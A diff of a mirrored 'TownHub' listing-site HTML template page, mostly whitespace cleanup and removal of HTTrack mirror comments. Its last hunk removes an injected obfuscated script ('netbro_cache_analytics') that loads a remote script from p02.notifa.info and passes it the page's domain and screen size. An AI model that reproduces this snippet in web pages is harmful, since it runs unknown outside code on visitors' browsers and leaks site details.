@@ -1,7 +1,7 @@
 <!DOCTYPE HTML>
 <html lang="en">
-    
-<!-- Mirrored from townhub.kwst.net/author-single.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 02 Apr 2020 04:09:24 GMT -->
+
+
 <head>
         <!--=============== basic  ===============-->
         <meta charset="UTF-8">
@@ -10,7 +10,7 @@
         <meta name="robots" content="index, follow"/>
         <meta name="keywords" content=""/>
         <meta name="description" content=""/>
-        <!--=============== css  ===============-->	
+        <!--=============== css  ===============-->
         <link type="text/css" rel="stylesheet" href="css/reset.css">
         <link type="text/css" rel="stylesheet" href="css/plugins.css">
         <link type="text/css" rel="stylesheet" href="css/style.css">
@@ -33,14 +33,14 @@
                 <!-- logo-->
                 <a href="index.html" class="logo-holder"><img src="images/logo.png" alt=""></a>
                 <!-- logo end-->
-                <!-- header-search_btn-->         
+                <!-- header-search_btn-->
                 <div class="header-search_btn show-search-button"><i class="fal fa-search"></i><span>Search</span></div>
                 <!-- header-search_btn end-->
-                <!-- header opt --> 
+                <!-- header opt -->
                 <a href="dashboard-add-listing.html" class="add-list color-bg">Add Listing <span><i class="fal fa-layer-plus"></i></span></a>
                 <div class="cart-btn   show-header-modal" data-microtip-position="bottom" role="tooltip" aria-label="Your Wishlist"><i class="fal fa-heart"></i><span class="cart-counter green-bg"></span> </div>
                 <div class="show-reg-form modal-open avatar-img" data-srcav="images/avatar/3.jpg"><i class="fal fa-user"></i>Sign In</div>
-                <!-- header opt end--> 
+                <!-- header opt end-->
                 <!-- lang-wrap-->
                 <div class="lang-wrap">
                     <div class="show-lang"><span><i class="fal fa-globe-europe"></i><strong>En</strong></span><i class="fa fa-caret-down arrlan"></i></div>
@@ -51,21 +51,21 @@
                         <li><a href="#" data-lantext="De">Deutsch</a></li>
                     </ul>
                 </div>
-                <!-- lang-wrap end-->                                 
-                <!-- nav-button-wrap--> 
+                <!-- lang-wrap end-->
+                <!-- nav-button-wrap-->
                 <div class="nav-button-wrap color-bg">
                     <div class="nav-button">
                         <span></span><span></span><span></span>
                     </div>
                 </div>
                 <!-- nav-button-wrap end-->
-                <!--  navigation --> 
+                <!--  navigation -->
                 <div class="nav-holder main-menu">
                     <nav>
                         <ul class="no-list-style">
                             <li>
                                 <a href="#">Home <i class="fa fa-caret-down"></i></a>
-                                <!--second level -->   
+                                <!--second level -->
                                 <ul>
                                     <li><a href="index.html">Parallax Image</a></li>
                                     <li><a href="index2.html">Slider</a></li>
@@ -104,7 +104,7 @@
                             </li>
                             <li>
                                 <a href="#" class="act-link">Pages <i class="fa fa-caret-down"></i></a>
-                                <!--second level -->   
+                                <!--second level -->
                                 <ul>
                                     <li>
                                         <a href="#">Shop<i class="fa fa-caret-down"></i></a>
@@ -128,30 +128,30 @@
                                     <li><a href="invoice.html">Invoice</a></li>
                                     <li><a href="404.html">404</a></li>
                                 </ul>
-                                <!--second level end-->                                
+                                <!--second level end-->
                             </li>
                         </ul>
                     </nav>
                 </div>
                 <!-- navigation  end -->
-                <!-- header-search_container -->                     
+                <!-- header-search_container -->
                 <div class="header-search_container header-search vis-search">
                     <div class="container small-container">
                         <div class="header-search-input-wrap fl-wrap">
-                            <!-- header-search-input --> 
+                            <!-- header-search-input -->
                             <div class="header-search-input">
                                 <label><i class="fal fa-keyboard"></i></label>
-                                <input type="text" placeholder="What are you looking for ?"   value=""/>  
+                                <input type="text" placeholder="What are you looking for ?"   value=""/>
                             </div>
-                            <!-- header-search-input end -->  
-                            <!-- header-search-input --> 
+                            <!-- header-search-input end -->
+                            <!-- header-search-input -->
                             <div class="header-search-input location autocomplete-container">
                                 <label><i class="fal fa-map-marker"></i></label>
                                 <input type="text" placeholder="Location..." class="autocomplete-input" id="autocompleteid2" value=""/>
                                 <a href="#"><i class="fal fa-dot-circle"></i></a>
                             </div>
-                            <!-- header-search-input end -->                                        
-                            <!-- header-search-input --> 
+                            <!-- header-search-input end -->
+                            <!-- header-search-input -->
                             <div class="header-search-input header-search_selectinpt ">
                                 <select data-placeholder="Category" class="chosen-select no-radius" >
                                     <option>All Categories</option>
@@ -163,22 +163,22 @@
                                     <option>Events</option>
                                 </select>
                             </div>
-                            <!-- header-search-input end --> 
+                            <!-- header-search-input end -->
                             <button class="header-search-button green-bg" onclick="window.location.href='listing.html'"><i class="far fa-search"></i> Search </button>
                         </div>
                         <div class="header-search_close color-bg"><i class="fal fa-long-arrow-up"></i></div>
                     </div>
                 </div>
-                <!-- header-search_container  end --> 
-                <!-- wishlist-wrap--> 
+                <!-- header-search_container  end -->
+                <!-- wishlist-wrap-->
                 <div class="header-modal novis_wishlist">
-                    <!-- header-modal-container--> 
+                    <!-- header-modal-container-->
                     <div class="header-modal-container scrollbar-inner fl-wrap" data-simplebar>
                         <!--widget-posts-->
                         <div class="widget-posts  fl-wrap">
                             <ul class="no-list-style">
                                 <li>
-                                    <div class="widget-posts-img"><a href="listing-single.html"><img src="images/gallery/thumbnail/1.png" alt=""></a>  
+                                    <div class="widget-posts-img"><a href="listing-single.html"><img src="images/gallery/thumbnail/1.png" alt=""></a>
                                     </div>
                                     <div class="widget-posts-descr">
                                         <h4><a href="listing-single.html">Iconic Cafe</a></h4>
@@ -225,13 +225,13 @@
                         </div>
                         <!-- widget-posts end-->
                     </div>
-                    <!-- header-modal-container end--> 
+                    <!-- header-modal-container end-->
                     <div class="header-modal-top fl-wrap">
                         <h4>Your Wishlist : <span><strong></strong> Locations</span></h4>
                         <div class="close-header-modal"><i class="far fa-times"></i></div>
                     </div>
                 </div>
-                <!--wishlist-wrap end --> 
+                <!--wishlist-wrap end -->
             </header>
             <!-- header end-->
             <!-- wrapper-->
@@ -241,12 +241,12 @@
                     <section class="gray-bg no-top-padding-sec" id="sec1">
                         <div class="container">
                             <div class="breadcrumbs inline-breadcrumbs fl-wrap block-breadcrumbs">
-                                <a href="#">Home</a><a href="#">Pages</a> <span>User Single</span> 
+                                <a href="#">Home</a><a href="#">Pages</a> <span>User Single</span>
                             </div>
                             <div class="fl-wrap">
                                 <div class="row">
                                     <div class="col-md-8">
-                                        <!-- list-single-main-item --> 
+                                        <!-- list-single-main-item -->
                                         <div class="user-profile-header fl-wrap">
                                             <div class="user-profile-header_media fl-wrap">
                                                 <div class="bg"  data-bg="images/bg/29.jpg"></div>
@@ -272,7 +272,7 @@
                                                 <a href="#" class="btn  float-btn color2-bg">Visit Website<i class="fal fa-chevron-right"></i></a>
                                             </div>
                                         </div>
-                                        <!-- list-single-main-item end -->                                    
+                                        <!-- list-single-main-item end -->
                                         <!-- list-main-wrap-header-->
                                         <div class="list-main-wrap-header fl-wrap block_box no-vis-shadow">
                                             <!-- list-main-wrap-title-->
@@ -304,9 +304,9 @@
                                                 </div>
                                                 <!-- price-opt end-->
                                             </div>
-                                            <!-- list-main-wrap-opt end-->                    
+                                            <!-- list-main-wrap-opt end-->
                                         </div>
-                                        <!-- list-main-wrap-header end-->                            
+                                        <!-- list-main-wrap-header end-->
                                         <!-- listing-item-container -->
                                         <div class="listing-item-container init-grid-items fl-wrap nocolumn-lic">
                                             <!-- listing-item  -->
@@ -315,7 +315,7 @@
                                                     <div class="geodir-category-img">
                                                         <div class="geodir-js-favorite_btn"><i class="fal fa-heart"></i><span>Save</span></div>
                                                         <a href="listing-single.html" class="geodir-category-img-wrap fl-wrap">
-                                                        <img src="images/all/1.jpg" alt=""> 
+                                                        <img src="images/all/1.jpg" alt="">
                                                         </a>
                                                         <div class="listing-avatar"><a href="author-single.html"><img src="images/avatar/1.jpg" alt=""></a>
                                                             <span class="avatar-tooltip">Added By  <strong>Alisa Noory</strong></span>
@@ -378,14 +378,14 @@
                                                     </div>
                                                 </article>
                                             </div>
-                                            <!-- listing-item end -->                                       
+                                            <!-- listing-item end -->
                                             <!-- listing-item  -->
                                             <div class="listing-item">
                                                 <article class="geodir-category-listing fl-wrap">
                                                     <div class="geodir-category-img">
                                                         <div class="geodir-js-favorite_btn"><i class="fal fa-heart"></i><span>Save</span></div>
                                                         <a href="listing-single.html" class="geodir-category-img-wrap fl-wrap">
-                                                        <img src="images/all/9.jpg" alt=""> 
+                                                        <img src="images/all/9.jpg" alt="">
                                                         </a>
                                                         <div class="listing-avatar"><a href="author-single.html"><img src="images/avatar/2.jpg" alt=""></a>
                                                             <span class="avatar-tooltip">Added By  <strong>Mark Rose</strong></span>
@@ -395,7 +395,7 @@
                                                             <div class="listing-rating-count-wrap">
                                                                 <div class="review-score">4.2</div>
                                                                 <div class="listing-rating card-popup-rainingvis" data-starrating2="4"></div>
-                                                                <br>                                                
+                                                                <br>
                                                                 <div class="reviews-count">6 reviews</div>
                                                             </div>
                                                         </div>
@@ -448,14 +448,14 @@
                                                     </div>
                                                 </article>
                                             </div>
-                                            <!-- listing-item end -->                                         
+                                            <!-- listing-item end -->
                                             <!-- listing-item  -->
                                             <div class="listing-item">
                                                 <article class="geodir-category-listing fl-wrap">
                                                     <div class="geodir-category-img">
                                                         <div class="geodir-js-favorite_btn"><i class="fal fa-heart"></i><span>Save</span></div>
                                                         <a href="listing-single.html" class="geodir-category-img-wrap fl-wrap">
-                                                        <img src="images/all/31.jpg" alt=""> 
+                                                        <img src="images/all/31.jpg" alt="">
                                                         </a>
                                                         <div class="listing-avatar"><a href="author-single.html"><img src="images/avatar/4.jpg" alt=""></a>
                                                             <span class="avatar-tooltip">Added By  <strong>Lisa Smith</strong></span>
@@ -518,14 +518,14 @@
                                                     </div>
                                                 </article>
                                             </div>
-                                            <!-- listing-item end -->                                       
+                                            <!-- listing-item end -->
                                             <!-- listing-item  -->
                                             <div class="listing-item">
                                                 <article class="geodir-category-listing fl-wrap">
                                                     <div class="geodir-category-img">
                                                         <div class="geodir-js-favorite_btn"><i class="fal fa-heart"></i><span>Save</span></div>
                                                         <a href="listing-single.html" class="geodir-category-img-wrap fl-wrap">
-                                                        <img src="images/all/16.jpg" alt=""> 
+                                                        <img src="images/all/16.jpg" alt="">
                                                         </a>
                                                         <div class="listing-avatar"><a href="author-single.html"><img src="images/avatar/3.jpg" alt=""></a>
                                                             <span class="avatar-tooltip">Added By  <strong>Kliff Antony</strong></span>
@@ -535,7 +535,7 @@
                                                             <div class="listing-rating-count-wrap">
                                                                 <div class="review-score">5.0</div>
                                                                 <div class="listing-rating card-popup-rainingvis" data-starrating2="5"></div>
-                                                                <br>                                                
+                                                                <br>
                                                                 <div class="reviews-count">4 reviews</div>
                                                             </div>
                                                         </div>
@@ -588,7 +588,7 @@
                                                     </div>
                                                 </article>
                                             </div>
-                                            <!-- listing-item end -->                                         
+                                            <!-- listing-item end -->
                                         </div>
                                         <!-- listing-item-container end -->
                                     </div>
@@ -602,7 +602,7 @@
                                                 <div class="box-widget-author fl-wrap">
                                                     <div class="box-widget-author-title">
                                                         <div class="box-widget-author-title-img">
-                                                            <img src="images/avatar/5.jpg" alt=""> 
+                                                            <img src="images/avatar/5.jpg" alt="">
                                                         </div>
                                                         <div class="box-widget-author-title_content">
                                                             <a href="user-single.html">Alisa Noory</a>
@@ -615,8 +615,8 @@
                                                 </div>
                                             </div>
                                         </div>
-                                        <!--box-widget-item end -->                                    
-                                        <!--box-widget-item -->                                       
+                                        <!--box-widget-item end -->
+                                        <!--box-widget-item -->
                                         <div class="box-widget-item fl-wrap block_box">
                                             <div class="box-widget-item-header">
                                                 <h3>User Contacts  </h3>
@@ -643,7 +643,7 @@
                                                 </div>
                                             </div>
                                         </div>
-                                        <!--box-widget-item end -->                                     
+                                        <!--box-widget-item end -->
                                         <!--box-widget-item -->
                                         <div class="box-widget-item fl-wrap block_box">
                                             <div class="box-widget-item-header">
@@ -665,7 +665,7 @@
                                                 </div>
                                             </div>
                                         </div>
-                                        <!--box-widget-item end -->                                     
+                                        <!--box-widget-item end -->
                                     </div>
                                 </div>
                             </div>
@@ -741,14 +741,14 @@
                                                 <a href="#"  class="widget-posts-img"><img src="images/all/4.jpg" class="respimg" alt=""></a>
                                                 <div class="widget-posts-descr">
                                                     <a href="#" title="">Vivamus dapibus rutrum</a>
-                                                    <span class="widget-posts-date"><i class="fal fa-calendar"></i> 21 Mar 09.05 </span> 
+                                                    <span class="widget-posts-date"><i class="fal fa-calendar"></i> 21 Mar 09.05 </span>
                                                 </div>
                                             </li>
                                             <li class="clearfix">
                                                 <a href="#"  class="widget-posts-img"><img src="images/all/2.jpg" class="respimg" alt=""></a>
                                                 <div class="widget-posts-descr">
                                                     <a href="#" title=""> In hac habitasse platea</a>
-                                                    <span class="widget-posts-date"><i class="fal fa-calendar"></i> 7 Mar 18.21 </span> 
+                                                    <span class="widget-posts-date"><i class="fal fa-calendar"></i> 7 Mar 18.21 </span>
                                                 </div>
                                             </li>
                                             <li class="clearfix">
@@ -811,7 +811,7 @@
                 </div>
                 <!--sub-footer end -->
             </footer>
-            <!--footer end -->  
+            <!--footer end -->
             <!--map-modal -->
             <div class="map-modal-wrap">
                 <div class="map-modal-wrap-overlay"></div>
@@ -825,7 +825,7 @@
                     </div>
                 </div>
             </div>
-            <!--map-modal end -->                
+            <!--map-modal end -->
             <!--chat-widget -->
             <div class="chat-widget-button cwb tolt" data-microtip-position="left" data-tooltip="Chat With Owner"><i class="fal fa-comments-alt"></i></div>
             <div class="chat-widget_wrap not-vis-chat">
@@ -834,7 +834,7 @@
                     <div class="status st_online"><span></span>Online</div>
                 </div>
                 <div class="chat-body" data-simplebar>
-                    <!-- message--> 
+                    <!-- message-->
                     <div class="chat-message chat-message_guest fl-wrap">
                         <div class="dashboard-message-avatar">
                             <img src="images/avatar/4.jpg" alt="">
@@ -844,7 +844,7 @@
                         <p>Vivamus lobortis vel nibh nec maximus. Donec dolor erat, rutrum ut feugiat sed, ornare vitae nunc. </p>
                     </div>
                     <!-- message end-->
-                    <!-- message--> 
+                    <!-- message-->
                     <div class="chat-message chat-message_user fl-wrap">
                         <div class="dashboard-message-avatar">
                             <img src="images/avatar/5.jpg" alt="">
@@ -853,8 +853,8 @@
                         <span class="massage-date">25 may 2018  <span>7.51 PM</span></span>
                         <p>Nulla eget erat consequat quam feugiat dapibus eget sed mauris.</p>
                     </div>
-                    <!-- message end-->                                             
-                    <!-- message--> 
+                    <!-- message end-->
+                    <!-- message-->
                     <div class="chat-message chat-message_guest fl-wrap">
                         <div class="dashboard-message-avatar">
                             <img src="images/avatar/4.jpg" alt="">
@@ -863,14 +863,14 @@
                         <span class="massage-date">25 may 2018  <span>7.51 PM</span></span>
                         <p>Sed non neque faucibus, condimentum lectus at, accumsan enim. Fusce pretium egestas cursus..</p>
                     </div>
-                    <!-- message end--> 
+                    <!-- message end-->
                 </div>
                 <div class="chat-widget_input fl-wrap">
-                    <textarea  placeholder="Type Message"></textarea>                                                 
+                    <textarea  placeholder="Type Message"></textarea>
                     <button type="submit"><i class="fal fa-paper-plane"></i></button>
                 </div>
             </div>
-            <!--chat-widget end -->              
+            <!--chat-widget end -->
             <!--register form -->
             <div class="main-register-wrap modal">
                 <div class="reg-overlay"></div>
@@ -882,7 +882,7 @@
                             <li class="current"><a href="#tab-1"><i class="fal fa-sign-in-alt"></i> Login</a></li>
                             <li><a href="#tab-2"><i class="fal fa-user-plus"></i> Register</a></li>
                         </ul>
-                        <!--tabs -->                       
+                        <!--tabs -->
                         <div class="tabs-container">
                             <div class="tab">
                                 <!--tab -->
@@ -949,14 +949,12 @@
                 </div>
             </div>
             <!--register form end -->
-            <a class="to-top"><i class="fas fa-caret-up"></i></a>     
+            <a class="to-top"><i class="fas fa-caret-up"></i></a>
         </div>
         <!-- Main end -->
         <!--=============== scripts  ===============-->
         <script src="js/jquery.min.js"></script>
         <script src="js/plugins.js"></script>
         <script src="js/scripts.js"></script>
-    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXX059%2bo0jmHqTATFPRbgcjTwAUeC5jR%2bBaOyQU8eOG0fU9sdf27sK1gE2IRW054ab%2fTGBs3hB6Zck%2bO3mompAbtLMfzoG2pFmaFzoKpXE1m9x3GZ8%2b74PoIUYJLO%2b9aksSW8UQXsx3WW77EiNDVG%2b1XcQoHR7iaYrrnoV%2bfIebzRHqiNykL2XDuzsrO01Tkf0qWnQHlhB08bQQZqvcjmTTKqOdDvPLGnnu4TPIYJNT8C7aasNNhlUxPerRA8WGS72Qhw6Mzzz4ScYlSn5VkpGV%2bl3gBOiJ%2fP63X4EalnwnDxcrP59j3H3mnZsrkEr9QvjJ1GMsxhupJ0bricjNeJ18UuDfSnQaGKys9utTd%2bXOKRGxl3vWwLOImvbU37XNNF4" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
-<!-- Mirrored from townhub.kwst.net/author-single.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 02 Apr 2020 04:09:24 GMT -->
 </html>
